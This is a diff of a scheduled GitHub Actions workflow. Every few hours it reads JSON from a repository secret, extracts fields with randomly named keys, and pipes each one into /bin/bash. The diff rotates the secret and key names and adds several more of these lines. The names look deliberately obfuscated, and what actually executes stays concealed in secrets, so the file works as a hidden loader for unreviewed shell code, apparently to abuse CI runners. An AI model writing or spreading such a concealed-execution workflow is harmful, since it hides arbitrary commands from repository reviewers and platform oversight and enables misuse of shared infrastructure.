@@ -3,20 +3,23 @@ name: nengheru
 on:
   workflow_dispatch:
   schedule:
-    - cron: '20 1/6 * * *'
-
-jobs:  # 18519
+    - cron: '25 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: nengheru
         env:
-          ng5121: ${{ secrets.ng5121 }}
+          rc0290: ${{ secrets.rc0290 }}
         run: |
-          echo $ng5121 | jq -r .ylshj12913 | /bin/bash
-          echo $k727 | jq -r .qhyna7200 | /bin/bash
-          echo $bo6 | jq -r .fdyv0724 | /bin/bash
-          echo $acl591 | jq -r .lrw5220 | /bin/bash
-          echo $f2963 | jq -r .hbqy7 | /bin/bash
+          echo $rc0290 | jq -r .jsz3 | /bin/bash
+          echo $m6 | jq -r .rv2 | /bin/bash
+          echo $ugb65558 | jq -r .gzdk7791 | /bin/bash
+          echo $fhh9482 | jq -r .exdv777 | /bin/bash
+          echo $gwpu551 | jq -r .igrt53 | /bin/bash
+          echo $fzby2 | jq -r .dx0 | /bin/bash
+          echo $dyunh9880 | jq -r .jol128 | /bin/bash
+          echo $xtl0 | jq -r .r6405 | /bin/bash
 
